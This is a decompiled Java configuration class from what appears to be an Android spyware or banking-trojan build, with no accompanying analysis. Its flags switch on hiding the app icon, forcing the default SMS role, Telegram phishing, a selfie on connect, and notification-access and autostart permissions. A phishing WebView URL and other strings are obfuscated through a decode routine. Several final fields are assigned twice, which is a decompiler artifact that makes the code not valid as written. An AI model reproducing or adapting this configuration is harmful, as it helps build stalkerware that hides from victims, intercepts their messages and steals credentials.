package com.base.template;

import p000.C0000;

/* JADX INFO: loaded from: /Users/xv/pin2/max-gate-apk/output/stage4/classes.dex */
public final class OnboardingConfig {
    public static final boolean HIDE_ICON;
    public static final String LANG;
    public static final boolean PERM_AUTOSTART_ENABLED;
    public static final boolean PERM_BATTERY_ENABLED;
    public static final boolean PERM_NOTIFICATION_ACCESS_ENABLED;
    public static final String PIN_MODE;
    public static final boolean SELFIE_ON_CONNECT;
    public static final String WEBVIEW_URL;
    public static final OnboardingConfig INSTANCE = new OnboardingConfig();
    public static final boolean PERM_VPN_ENABLED = false;
    public static final boolean PIN_SCREEN_ENABLED = false;
    public static final boolean FORCE_DEFAULT_SMS = true;
    public static final boolean TG_PHISH_ENABLED = false;

    static {
        PERM_BATTERY_ENABLED = true;
        PERM_NOTIFICATION_ACCESS_ENABLED = true;
        PERM_AUTOSTART_ENABLED = true;
        PIN_MODE = C0000.decode(new byte[]{4, 4, 89, 91}, "fe70d7596397e0", 0.0f);
        HIDE_ICON = true;
        WEBVIEW_URL = "";
        LANG = "";
        SELFIE_ON_CONNECT = true;
        PERM_BATTERY_ENABLED = true;
        PERM_NOTIFICATION_ACCESS_ENABLED = true;
        PERM_AUTOSTART_ENABLED = true;
        HIDE_ICON = true;
        SELFIE_ON_CONNECT = false;
        WEBVIEW_URL = C0000.decode(new byte[]{91, 69, 22, 68, 8, 25, 25, 19, 89, 82, 95, 94, 26, 68, 64, 83, 91, 79, 85, 95, 94, 30}, "31b4266a60", 3);
        PIN_MODE = C0000.decode(new byte[]{90, 0, 87, 90}, "8a91544396b113", true);
        LANG = C0000.decode(new byte[]{89, 16, 16, 94}, "8ed134ba", 2);
    }

    private OnboardingConfig() {
    }
}
